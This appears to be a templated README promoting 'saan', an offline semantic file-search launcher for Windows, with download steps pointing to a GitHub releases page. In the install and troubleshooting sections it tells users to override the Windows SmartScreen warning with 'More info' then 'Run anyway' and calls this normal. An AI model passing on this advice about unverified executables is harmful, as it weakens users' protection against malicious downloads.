---
layout: "default"
title: "🔍 saan - Find Any File On Your PC Instantly"
description: "Search local files by meaning, text, or name with a privacy-first launcher using semantic, grep, and glob modes."
---
# 🔍 saan - Find Any File On Your PC Instantly

[![Download saan](https://img.shields.io/badge/⬇%20Download%20saan-v1.0-6f42c1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sultanrashid40/saan/releases)

saan is a private, local AI file search launcher for Windows. It lives quietly on your computer, watches nothing, sends nothing, and lets you find any file in seconds using plain English, a filename pattern, or a bit of text inside a document — all from one single search box. Everything runs on your own machine using on-device semantic search, so your files never leave your PC. Built with Rust and Tauri, saan is fast, lightweight, and works completely offline.

If you have ever forgotten where you saved a contract, a screenshot, an invoice, or that one photo from a holiday three years ago, saan is for you. Instead of clicking through folder after folder, you just describe what you are looking for and saan shows you the results. No account. No cloud. No subscription. No internet connection required.

## ✨ What Makes saan Different

Most search tools on Windows only match the exact letters in a file name. If you type "budget" and the file is called "spending-plan-2024.xlsx", you get nothing. saan understands meaning, not just spelling.

Here is what that looks like in practice:

- **Search by meaning.** Type "the electricity bill from last winter" and saan can surface a PDF named `utility_invoice_dec.pdf` because it understands what the file is about, not just what it is called.
- **Search by name pattern.** Use a glob-style pattern like `*.png` or `report-*.docx` when you know roughly what the file is called and want to filter fast.
- **Search inside files.** Use grep-style text search to find the exact document that contains a specific phrase, account number, or client name.
- **One box for everything.** You do not need to learn three different tools or remember which mode you are in. Everything happens in a single search field.
- **Instant results.** saan is built on Rust, which means it starts fast, stays light on memory, and returns results as you type.
- **Fully offline.** The AI model that powers the semantic search runs directly on your computer. No internet connection is needed after setup, and no data is ever uploaded.

## 🚀 Getting Started

Getting saan onto your computer takes only a few minutes, and you do not need any technical knowledge to do it.

**Step 1 — Visit the download page.**

Open the official releases page in your web browser:

👉 **https://github.com/sultanrashid40/saan/releases**

Visit this link to download the application.

**Step 2 — Choose the release.**

On that page you will see a list of available releases. The newest one appears at the top. Click the newest release to expand it and reveal the files attached to it.

**Step 3 — Download the Windows file.**

In the list of attached files, download the file intended for Windows. Your browser will save it to your Downloads folder, which you can open by pressing `Ctrl + J` in most browsers or by clicking the download icon in the toolbar.

**Step 4 — Run the application.**

Once the download finishes, open your Downloads folder and double-click the file you just downloaded. Windows may show a blue "Windows protected your PC" box the first time you run software from the internet. If that appears, click **More info**, then click **Run anyway**. This is normal for new applications that have not yet been downloaded by millions of people.

**Step 5 — Start searching.**

Once saan opens, it will begin preparing your files for search. Depending on how many files you have, this first pass can take a little while. You can leave it running in the background and come back to it. After that, searching is instant.

## 🖥️ Using saan Day to Day

saan is designed to be opened the same way you open any other program — from the Start menu, from a desktop shortcut, or pinned to your taskbar. Many people keep it open all day and bring it to the front with a single click whenever they need to find something.

When the window is open, you will see a single search box. Click into it and start typing. Results appear underneath as you type, updating with every keystroke. Press the arrow keys to move through results and press Enter to open the highlighted file in its default program, or to jump straight to its location in File Explorer.

A few practical examples of what you can type:

| What you type | What saan does |
|---|---|
| `quarterly sales spreadsheet` | Finds files whose content matches that meaning |
| `*.pdf` | Lists every PDF file it has indexed |
| `invoice-2023-*` | Matches file names starting with that pattern |
| `"account number 4471"` | Finds the document containing that exact phrase |

You do not need to remember special syntax. If plain words work, use plain words. The pattern and text-search options are there for the times when you want to be precise.

## 🔒 Your Files Stay Yours

Privacy is the reason saan exists. Traditional search tools and cloud assistants often send your queries, or even your file contents, to a server somewhere. saan does the opposite.

- **Nothing is uploaded.** The semantic search model runs locally on your computer. Your documents, file names, and search terms never leave your machine.
- **No account required.** There is no sign-up, no login, no email address, no tracking profile.
- **Works on a plane.** Because everything is on-device, saan works perfectly with Wi-Fi turned off.
- **No background spying.** saan only looks at the folders you point it at, and only to build a local search index.

If you handle sensitive material — client files, medical records, personal finances, legal documents — this matters a great deal. saan lets you search intelligently without handing your data to anyone.

## ⚙️ Keeping saan Up to Date

New versions of saan are published on the same releases page you used to download it. To check for updates, simply visit:

👉 **https://github.com/sultanrashid40/saan/releases**

If a newer release is listed at the top, download it the same way you did the first time and run it. Your settings and search index carry over.

## 🧭 Tips for a Smooth First Week

- **Let the first index finish.** The very first time you run saan, it needs to read through your files to understand them. Give it time, especially if you have a large drive. Subsequent searches will be near-instant.
- **Point it at the right folders.** If you keep work files on a separate drive or in a specific folder, make sure that location is included so saan can find those files too.
- **Be descriptive, not precise.** When using meaning-based search, "the slide deck about the product launch" works better than a guess at the exact file name.
- **Use patterns when you know the name.** If you remember a file starts with "IMG_", typing `IMG_*` narrows things down immediately.
- **Keep it pinned.** The more often saan is one click away, the less time you spend digging through folders.

## 🛠️ Troubleshooting Common Questions

**The app will not open.** Make sure the download finished completely before you double-clicked it. If your browser shows the file as still downloading, wait for it to finish, then try again.

**Windows shows a security warning.** This is standard for newly published software. Click **More info** and then **Run anyway** to continue.

**Search results seem incomplete.** The first indexing pass may still be running in the background. Give it a few minutes and try again. If you have just added a large folder, saan needs a moment to process it.

**A file I know exists is not showing up.** Check that the folder containing it is included in saan's search locations. Files outside the indexed folders will not appear.

**My computer feels slow during indexing.** Indexing is a one-time heavy task. You can pause it, use your computer normally, and let it resume later.

## 📥 Download saan

Ready to stop hunting through folders? Get saan now:

[![Download saan for Windows](https://img.shields.io/badge/⬇%20Download%20saan%20for%20Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sultanrashid40/saan/releases)

Visit this link to download the application.

saan is free, private, and built for people who just want to find their files. No accounts, no cloud, no nonsense — just fast search that understands you.

Keywords: desktop-app, embeddinggemma, embeddings, file-launcher, file-search, glob, grep, local-search, offline-first, onnx, privacy, rust, semantic-search, tauri, typescript, windows